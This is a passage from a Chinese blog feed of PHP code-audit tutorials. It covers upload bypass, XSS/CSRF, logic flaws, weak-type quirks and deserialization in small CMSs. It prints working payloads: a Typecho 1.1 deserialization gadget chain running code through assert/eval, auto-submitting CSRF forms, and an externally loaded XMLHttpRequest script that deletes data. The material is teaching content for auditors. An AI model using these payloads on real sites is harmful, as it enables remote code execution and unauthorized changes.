src="https://img-blog.csdnimg.cn/2020040119510863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h1><p>文件上传只有一个函数 <code>move_uploaded_file()</code> 一般来说，我们就可以搜索这个函数来回溯，看他的验证方式，是黑名单还是白名单，是否是前端限制，是否只是简单的验证了文件头，是否是能绕过的正则匹配，是否渲染了图片。</p><p>结合zzzphp来审计一下文件上传，全局搜索<code>move_uploaded_file</code></p><p>\zzzcms\inc\zzz_file.php</p><p><img src="https://img-blog.csdnimg.cn/20200401195134341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>回溯看看那里调用了这个函数</p><p><img src="https://img-blog.csdnimg.cn/20200401195203698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>典型的黑名单验证，可以使用asa绕过，只需要在后台添加这个扩展名</p><p><img src="https://img-blog.csdnimg.cn/2020040119522365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>上传即可，当然也可以通过上图中的 switch分支，只要传入的 type不是他的类型就可以跳过后台添加这个步骤，</p><p><img src="https://img-blog.csdnimg.cn/20200401195240885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>对文件的操作还见于写入其他配置文件，典型的有thinkphp缓存文件写入。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS与CSRF审计</title>
      <link href="/2020/040120077.html"/>
      <url>/2020/040120077.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出的地方都是它出现的地方，很多网站的突破口可能就是一个XSS。</p><h1 id="0x01-XSS实战审计"><a href="#0x01-XSS实战审计" class="headerlink" title="0x01 XSS实战审计"></a>0x01 XSS实战审计</h1><p>这次选用的CMS还是熊海，我们通过搭建环境查看输入的地方来审计，学习下高效率审计方式。</p><p><img src="https://img-blog.csdnimg.cn/20200401193920467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>随意留言抓包看看他请求的url再去找相对的文件<code>/?r=submit&amp;type=message</code> 当然你还是得看看他是怎么调用文件的，这里就是加载submit文件中的message方法。</p><p>我们来到 files/submit.php</p><p><img src="https://img-blog.csdnimg.cn/20200401193938637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>前面的输入基本都没过过滤，到了最后一步<code>$content</code>被 <code>addslashes(strip_tags($content));</code>过滤，所以我们XSS其他地方即可，看到这里我们在挖洞的过程中所以不要纠结一点。</p><p><img src="https://img-blog.csdnimg.cn/20200401193955420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>一般过滤xss的函数还有<code>htmlspecialchars</code>，我们审计他的注意点就是查看一些输出函数print、print_r、echo、printf、die、var_dump、var_export。</p><h1 id="0x02-Csrf"><a href="#0x02-Csrf" class="headerlink" title="0x02 Csrf"></a>0x02 Csrf</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br>CSRF实际上就是利用你的身份去发送恶意请求，我们需要知道CSRF分为GET型提交的和POST，前者危害更大，后者一般可以寻找XSS来配合我们。GET型的比如一个链接 <a href="http://www.404.com/1.php?id=1" target="_blank" rel="noopener">http://www.404.com/1.php?id=1</a> 访问即可删除账号，然后你在论坛发帖构造<br><code>&lt;img src=&quot;http://www.404.com/1.php?id=1&quot;&gt;</code> 那么访问这个帖子的人账号都将会删除，POST的见下文，造成CSRF的原因就是没有使用token或者验证其他值，审计就看页面有没有token、referer验证，验证是否可以绕过，不过我推荐还是先黑盒，看看有没有token，删除了referer是否能够访问，再结合代码来看。</p><p>我们来看到zzzphp的后台，他是没有token的，同时我们前面审计到了他的代码执行，配合这个csrf就可以直接getshell。</p><p><img src="https://img-blog.csdnimg.cn/20200401194015415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>如果你不会自己写这个代码，不妨使用burp生成一个测试页面，右键选择即可。</p><p><img src="https://img-blog.csdnimg.cn/20200401194045925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这是个需要点击的表单,你可以加一段JavaScript代码来自动提交。</p><pre><code>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </code></pre><h1 id="0x03-组合利用"><a href="#0x03-组合利用" class="headerlink" title="0x03 组合利用"></a>0x03 组合利用</h1><p>这里只是个简单的组合，由于没找到具体实验环境我只有简单的演示一下(懒)<br>本次选妃zzzphp，由于他后台没有的xss，我只能登陆后台后查看前台了。</p><p>1.构造CSRF表单自动提交<br>payload：</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;         //burp生成的表单      &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;</code></pre><p>2.插入iframe标签</p><p>payload：</p><pre><code>&lt;iframe src=&quot;http://404.com/zzzp6p/1.html&quot; /&gt;</code></pre><p>还可以使用XMLHTTPRequest发送POST、GET，按情况选择，这里把payload插入手机号码。</p><p><img src="https://img-blog.csdnimg.cn/20200401194114299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>用登陆了后台后访问页面，可以看到显示修改成功。</p><p>由于没找到想要的源码我简单介绍下利用XMLHTTPRequest来发包,漏洞程序还是熊海cms删除一友情链接</p><p>payload 1.js：</p><pre><code>function del() {    var xhr = new XMLHttpRequest();    xhr.open(&#39;GET&#39;,&#39;/xiong/admin/?r=linklist&amp;delete=6&#39;);    xhr.send(null);    }del();</code></pre><p>payload：</p><pre><code>&lt;script src=&quot;http://404.com/xiong/1.js&quot;&gt;&lt;/script&gt; </code></pre><p>查看留言板可以看到我们的XMLHTTPRequest已经发包了</p><p><img src="https://img-blog.csdnimg.cn/2020040119425729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>比较典型的例子可以看看 <a href="https://xz.aliyun.com/t/3177" target="_blank" rel="noopener">https://xz.aliyun.com/t/3177</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞审计</title>
      <link href="/2020/040118560.html"/>
      <url>/2020/040118560.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>逻辑漏洞是指由于程序逻辑不严，或者函数使用不当，导致发生越权访问，cookies绕过，越权密码修改，重复安装等等问题。一般逻辑漏洞的挖掘需要对代码有一定阅读能力。</p><h1 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h1><p>越权一般是对cookies的验证不严或者没有验证，一般我们审计后台发现某个功能没有包含验证文件，那么很有可能发生越权操作，当然越权有很多不仅仅局限于一个后台访问的问题。在众多大型网站越权问题也时常发生的，这也是漏洞挖掘中大家都比较喜欢的，有些越权在黑盒测试中或许更加容易发现，所以代码审计大家灵活运用，不要局限了你的思路。越权是个大的专题，我应该是讲不了多少还是请大家多看看文章。</p><p>1.<strong>后台越权</strong>：后台某些页面没有引入验证文件</p><p><img src="https://img-blog.csdnimg.cn/202004011954497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>比如这里熊海cms如果我们删除这个验证，那么就可以直接访问这个页面，有很多程序员他会忘记每个页面都添加。</p><p>2.<strong>水平越权</strong>：一个用户尝试访问与他拥有相同权限的用户的资源，比如删除收获地址处没有验证权限,导致越权删除其他人的地址。</p><p>我们用zzzcms这个程序来做演示 zzzcms\form\index.php</p><p><img src="https://img-blog.csdnimg.cn/20200401195505903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>他这里是edituser是没有越权的，我这里只是讲解一下，简单的介绍一下越权如何去审计。我们看这个代码他最后update的时候是修改我们的uid现对的值，而我们的uid是POST包获取的，也就是如果我们可控uid那么就能越权修改其他人的资料。<br>但是这里有一条验证<code>$uid != get_session( &#39;uid&#39; )and back( &#39;很抱歉，资料修改失败&#39; );</code> 所以没办法越权，为了演示我们可以删除了来看看。</p><p><img src="https://img-blog.csdnimg.cn/20200401195523272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>成功把UID为1的用户的资料修改了。</p><p>3.<strong>垂直越权</strong>：一个低级用户尝试访问高级别用户的功能。</p><h1 id="0x02-cookies验证不严"><a href="#0x02-cookies验证不严" class="headerlink" title="0x02 cookies验证不严"></a>0x02 cookies验证不严</h1><p>这里用到熊海CMS，我们随便点击一个后台页面，前面包含了一个验证文件<code>require &#39;../inc/checklogin.php&#39;;</code> 来看看这个文件</p><p><img src="https://img-blog.csdnimg.cn/20200401195539229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>判断我们的cookies里面user是否为空，不为空就可以访问后台了。</p><p><img src="https://img-blog.csdnimg.cn/20200401195558912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x03-安装程序逻辑问题"><a href="#0x03-安装程序逻辑问题" class="headerlink" title="0x03 安装程序逻辑问题"></a>0x03 安装程序逻辑问题</h1><p>这里找了半天源码发现红日安全写过一个Simple-Log1.6这里就用他这个源码了。</p><p><img src="https://img-blog.csdnimg.cn/20200401195614713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这里他判断是否安装了,然后就直接跳转到主页，而程序没有退出，那么后面的依然可以执行，也就是说直接post后面的程序即可安装。</p><p><img src="https://img-blog.csdnimg.cn/20200401195631274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这类没有正确退出的造成的漏洞还是蛮多的，在后台等地方可以好好关注一下。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>当然逻辑漏洞不止就这些，还有其他的问题比如验证码逻辑的绕过，函数的缺陷，推荐大家多看看别人的审计文章。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数或弱类型的缺陷和特性</title>
      <link href="/2020/040143195.html"/>
      <url>/2020/040143195.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章来自 公众号：404安全</p><h1 id="0x00-in-array"><a href="#0x00-in-array" class="headerlink" title="0x00  in_array()"></a>0x00  in_array()</h1><p><code>in_array(search,array,type)</code> 如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。 </p><p>那么为什么会出现安全问题呢，我们来看看下面代码</p><p><img src="https://img-blog.csdnimg.cn/20200401195938792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>在没设置第三个参数的情况下<code>in_array()</code>函数将会吧<code>1 and 1=1</code>转为数字1比较，那么这样就造成了一些安全问题，在注入或上传的情况下可能绕过。</p><h1 id="0x01-is-number"><a href="#0x01-is-number" class="headerlink" title="0x01 is_number()"></a>0x01 is_number()</h1><p><code>is_number()</code> 函数他会判断变量是否为数字或者数字字符串，假如我们传入的字符串为16进制，那么他也是认定为数字的。</p><p><img src="https://img-blog.csdnimg.cn/20200401195955987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们知道我们向mysql插入数据的时候是可以是16进制的，他取出来就会还原成原始字符串，这样用<code>is_number()</code> 函数检测后肯能就会存在二次注入。</p><h1 id="0x02-PHP弱类型的特性"><a href="#0x02-PHP弱类型的特性" class="headerlink" title="0x02 PHP弱类型的特性"></a>0x02 PHP弱类型的特性</h1><p>php是一款弱类型语言，他在使用==比较字符串的时候会把字符串类型转化成相同的再比较，那么这样也会造成一些问题.</p><p><img src="https://img-blog.csdnimg.cn/20200401200012878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>他能遇到字符串的0e,0x就会解析成对应的科学计数和16进制。</p><h1 id="0x03-switch"><a href="#0x03-switch" class="headerlink" title="0x03 switch()"></a>0x03 switch()</h1><p>case是数字类型时，switch会把参数转换为int类型</p><p><img src="https://img-blog.csdnimg.cn/20200401200027146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x04-strcmp"><a href="#0x04-strcmp" class="headerlink" title="0x04 strcmp()"></a>0x04 strcmp()</h1><p>比较函数如果两者相等返回0，string1&gt;string2返回&gt;0 反之小于0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。</p><p><img src="https://img-blog.csdnimg.cn/20200401200049798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x05-preg-match"><a href="#0x05-preg-match" class="headerlink" title="0x05 preg_match()"></a>0x05 preg_match()</h1><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题。</p><p><img src="https://img-blog.csdnimg.cn/20200401200106807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x06-文末"><a href="#0x06-文末" class="headerlink" title="0x06 文末"></a>0x06 文末</h1><p>当然还有反序列化、变量覆盖等等，这里就不全部写了，我会单独拿出来写，还有一些函数的特性留给大家自行搜索。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化审计</title>
      <link href="/2020/040118672.html"/>
      <url>/2020/040118672.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全<br>PHP反序列化漏洞，在我们使用<code>unserialize()</code>进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过程。</p><h1 id="0x01-初识反序列化"><a href="#0x01-初识反序列化" class="headerlink" title="0x01 初识反序列化"></a>0x01 初识反序列化</h1><p>反序列化我们需要了解php的类和魔术方法，这里举个简单的例子用到的魔术方法是<code>__destruct</code> 销毁一个类之前执行执行析构方法。</p><p><img src="https://img-blog.csdnimg.cn/20200401200818728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>当对象创建后输出我们的<code>$a</code>变量的值。那么我们把它的值改变后用<code>serialize()</code>看看</p><p><img src="https://img-blog.csdnimg.cn/20200401200841950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p><code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:5:&quot;12345&quot;;}</code> 是我们序列化的值，然后<code>unserialize($_GET[&#39;id&#39;]);</code>传入我们改变的值 <code>O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;404&quot;;}</code> 成功打印了我们的改变的值，因为反序列化我们可以控制类属性且这个过程会触发这些能够触发的魔术方法。</p><p>这里网上可以找到一些魔术方法,当然还有些可以绕过具体大家搜索一下我这里就不细写了，具体情况具体分析，反序列化难一点的还是需要很大的耐心才能完成。</p><pre><code>__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h1 id="0x02-简单的一道题"><a href="#0x02-简单的一道题" class="headerlink" title="0x02 简单的一道题"></a>0x02 简单的一道题</h1><p>下面我改了写一道简单的CTF，看看怎么利用它。</p><pre><code>&lt;?phpclass foo1{    public $varr;    function __destruct(){        $this-&gt;varr-&gt;evaltest();    }}class foo2{    public $str;    function evaltest(){        eval($this-&gt;str);    }}?&gt;</code></pre><p>我们看到在foo2中<code>evaltest()</code>函数中存在eval，而foo1中调用了函数<code>evaltest()</code>，我们就想可不可以让foo1调用foo2中的<code>evaltest()</code>函数顺边还把它的<code>$str</code>中的值改写了。</p><pre><code>&lt;?phpclass foo1{    public $varr;    function __construct(){        $this-&gt;varr = new foo2();    }}class foo2{    public $str;    function __construct(){        $this-&gt;str = &#39;phpinfo();&#39;;  }}$obj = new foo1();echo serialize($obj); ?&gt;</code></pre><p>我们把<code>$varr</code>变量赋值为<code>new foo2()</code> 然后它再去调用 <code>evaltest()</code>函数 然后我们把<code>$str</code>的值换成 我们想执行的命令。</p><p><img src="https://img-blog.csdnimg.cn/20200401200911528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><hr><h1 id="0x03-实例审计"><a href="#0x03-实例审计" class="headerlink" title="0x03 实例审计"></a>0x03 实例审计</h1><p>找了半天源码我觉得最有意义的，审计的最多的一次反序列化当属Typecho1.1版本的漏洞了。可能看起来有点吃力我尽量分析的详细一点。</p><p>来到文件 <code>install.php</code></p><p><img src="https://img-blog.csdnimg.cn/20200401200940720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们看到要绕过<code>install.php</code>这个程序的<code>exit</code> 我们只需要传入的<code>finish</code>值不为空且<code>referer</code>为本站的值就能绕过。</p><p>我们来到核心部分</p><p><img src="https://img-blog.csdnimg.cn/2020040120100676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这里调用<code>Typecho_Cookie</code>类的<code>get</code>方法 ，我这里就不跟进去了，就是获取cookies的<code>__typecho_config</code> 字段值，然后<code>base64_decode()</code>在进行反序例化赋值给变量<code>$config</code>,然后我们全局搜索下魔术方法<code>__destruct</code>之类的发现没有可以利用的点.</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5Abty5vn-1585742842063)(./img/1.9.7.png)]</p><p>然后我们跟进这个<code>Typecho_Db</code>类看看，他传入了<code>$config[&#39;adapter&#39;]</code> 和 <code>$config[&#39;prefix&#39;]</code>。</p><p>var\Typecho\Db.php</p><p><img src="https://img-blog.csdnimg.cn/20200401201049906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这里使用<code>.</code>连接<code>$adapterName</code>为一个类的话那么会触发<code>__toString()</code>这个魔术方法。</p><p><img src="https://img-blog.csdnimg.cn/20200401201108646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>然后全局搜索<code>__toString()</code>,来看看那里可以利，找到<code>\var\Typecho\Feed.php</code>。</p><p><img src="https://img-blog.csdnimg.cn/20200401201122813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>如果<code>$item[&#39;author&#39;]</code>是一个类且<code>screenName</code>是一个私有或者未定义的属性那么就会自动触发<code>__get()</code></p><p><img src="https://img-blog.csdnimg.cn/20200401201136793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>那么我们就搜索看看那里有可以利用的<code>__get()</code></p><p>在var\Typecho\Request.php 有这么一处</p><p><img src="https://img-blog.csdnimg.cn/20200401201238725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我把跟进的代码都放在了一块，其中__get 调用了 <code>get()</code>函数，然后它又调用了<code>_applyFilter()</code>函数，其中还有可以造成命令执行的回调函数<code>call_user_func()</code>和<code>array_map()</code> 其中参数还可以控制，那么我的攻击链也算找完了，下面来梳理一下</p><p>攻击链：</p><pre><code>install.php        |绕过程序退出来到unserialize()        |db.php中__construct() 触发__toString()        |Feed.php中__toString触发__get()        |request.php中__get()调用get()-&gt;_applyFilter()-&gt;回调函数</code></pre><p>下面来构造exp，为了方便理解我们可以从尾到头来写</p><p>首先我们需要<code>_applyFilter</code>中的<code>$filter</code>的值为一个命令函数这里一般选择<code>assert()</code>,然后要让<code>get()</code>中的<code>$value</code>就是我们传入的命令也就是<code>_params[&#39;screenName&#39;]</code>，所以可以构造如下。</p><pre><code>class Typecho_Request{    private $_params = array(&#39;screenName&#39; =&gt;&#39;eval(\&#39;phpinfo();exit();\&#39;)&#39;);    private $_filter = array(&#39;assert&#39;);}</code></pre><p><code>request.php</code>构造完了再构造<code>Feed.php</code>中需要的值,这里我们要进入<code>$item[&#39;author&#39;]-&gt;screenName</code>这个前面有个<code>self::RSS2 == $this-&gt;_type</code>语句 RSS2= RSS 2.0所以赋值对应的，这里的调用跟我前面写的那个CTF类似。</p><pre><code>class  Typecho_Feed{       private $_type = &#39;RSS 2.0&#39;;    private $_items ;       public function __construct (){        $this-&gt;_items[] = array(&#39;author&#39; =&gt; new Typecho_Request());    }}</code></pre><p>最后回到<code>install.php中</code> 看到<code>$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code> 触发<code>db.php</code>中的<code>__construct()</code>需要传入2个值，但是有个是默认的所以我们传入一个我们序列化的上面的值就可以了。</p><p>payload :</p><pre><code>&lt;?phpclass Typecho_Request{    private $_params = array(&#39;screenName&#39; =&gt;&#39;eval(\&#39;phpinfo();exit();\&#39;)&#39;);    private $_filter = array(&#39;assert&#39;);}class  Typecho_Feed{       private $_type = &#39;RSS 2.0&#39;;    private $_items ;       public function __construct (){        $this-&gt;_items[] = array(&#39;author&#39; =&gt; new Typecho_Request());    }}$payload = array(&#39;adapter&#39;=&gt;new Typecho_Feed());echo base64_encode(serialize($payload));?&gt;</code></pre><p>为什么这里payload <code>phpinfo();exit();</code>中有<code>exit()</code> ,因为程序开始使用了<code>ob_start()</code> 这个函数会把输出放进缓冲区，触发异常后<code>ob_end_clean()</code> 会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。</p><p><img src="https://img-blog.csdnimg.cn/20200401201409908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这类反序列化一般寻找起来还是很有难度的，个人感觉两头向中间来找方便一些，找到可以利用的入口，再到可以利用的函数，再从入口点想办法到利用点。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>反序列化的地方还可以搭配注入 比如espcms的search.php注入。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖审计</title>
      <link href="/2020/04013701.html"/>
      <url>/2020/04013701.html</url>
      
